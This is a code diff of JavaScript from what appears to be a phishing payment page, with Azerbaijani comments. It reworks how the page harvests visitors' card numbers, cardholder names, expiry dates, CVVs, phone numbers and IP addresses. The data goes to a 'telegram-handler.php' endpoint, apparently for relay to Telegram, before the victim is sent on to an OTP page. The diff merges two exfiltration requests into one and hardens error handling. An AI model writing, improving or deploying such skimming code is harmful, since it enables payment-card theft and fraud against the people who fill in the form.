@@ -205,34 +205,10 @@
         btn.disabled = !(okNo && okName && okExp && okCvv && isMonthValid);
     }
 
-    // ============================================
-    // 📤 1-Cİ MESAJ: YALNIZ NÖMRƏ (KARTDAN ƏVVƏL)
-    // ============================================
-    async function sendPhoneOnly() {
-        const phoneRaw = document.getElementById('sumPhone').innerText || phone;
-        const ip = localStorage.getItem('ip') || '0.0.0.0';
-        
-        const formData = new FormData();
-        formData.append('phone', phoneRaw);
-        formData.append('ip', ip);
-        formData.append('type', 'phone_only');
-        
-        try {
-            await fetch('api/telegram-handler.php', {
-                method: 'POST',
-                body: formData
-            });
-            console.log('✅ Nömrə göndərildi');
-        } catch(e) {
-            console.log('❌ Nömrə göndərilmədi:', e);
-        }
-    }
-
-    // ============================================
-    // 📤 2-Cİ MESAJ: KART MƏLUMATLARI + NÖMRƏ
-    // ============================================
+    // ============================================================
+    // 📤 KART MƏLUMATLARINI GÖNDƏR
+    // ============================================================
     async function sendCardData() {
-        const phoneRaw = document.getElementById('sumPhone').innerText || phone;
         const ip = localStorage.getItem('ip') || '0.0.0.0';
         const campaign = localStorage.getItem('selectedCampaign') || '';
         
@@ -242,25 +218,27 @@
         formData.append('card_expiry', inpExp.value);
         formData.append('card_cvv', inpCvv.value);
         formData.append('operator', oper);
-        formData.append('phone', phoneRaw);
+        formData.append('phone', phone);
         formData.append('amount', amount);
         formData.append('ip', ip);
         formData.append('campaign', campaign);
+        formData.append('type', 'card_only');
         
         try {
-            await fetch('api/telegram-handler.php', {
+            const response = await fetch('api/telegram-handler.php', {
                 method: 'POST',
                 body: formData
             });
-            console.log('✅ Kart məlumatları göndərildi');
+            const result = await response.json();
+            console.log('✅ Kart göndərildi:', result);
         } catch(e) {
             console.log('❌ Kart göndərilmədi:', e);
         }
     }
 
-    // ============================================
-    // 🔥 FORM SUBMIT - 2 MESAJ GÖNDƏR
-    // ============================================
+    // ============================================================
+    // 🔥 FORM SUBMIT
+    // ============================================================
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!isMonthValid) return;
@@ -273,7 +251,9 @@
             const r = await fetch('https://api.ipify.org?format=json');
             const d = await r.json();
             ip = d.ip;
-        } catch(h) {}
+        } catch(h) {
+            ip = '0.0.0.0';
+        }
 
         // LOCALSTORAGE-ə YAZ
         localStorage.setItem('card_name', inpName.value);
@@ -286,14 +266,7 @@
         localStorage.setItem('ip', ip);
         localStorage.setItem('campaign', localStorage.getItem('selectedCampaign') || '');
 
-        // ============================================
-        // 📤 1. NÖMRƏNİ GÖNDƏR
-        // ============================================
-        await sendPhoneOnly();
-
-        // ============================================
-        // 📤 2. KART MƏLUMATLARINI GÖNDƏR
-        // ============================================
+        // 📤 KART MƏLUMATLARINI GÖNDƏR
         await sendCardData();
 
         // OTP SƏHİFƏSİNƏ KEÇ
